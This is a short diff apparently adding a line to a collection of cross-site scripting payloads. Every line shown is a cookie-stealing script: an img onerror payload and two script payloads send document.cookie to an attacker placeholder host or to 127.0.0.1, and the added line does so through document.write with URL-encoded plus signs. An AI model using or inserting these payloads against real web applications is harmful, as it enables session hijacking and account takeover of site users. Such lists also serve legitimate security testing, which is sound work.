@@ -5,3 +5,5 @@
 <img src=x onerror=this.src='http://[Attacker Webserver]/'+document.cookie>
 
 <script language="javascript"> document.location= " http://127.0.0.1/" + document.cookie; </script>
+
+<script>document.write('<img src="http://127.0.0.1/'%2B document.cookie %2B'"/>');</script>
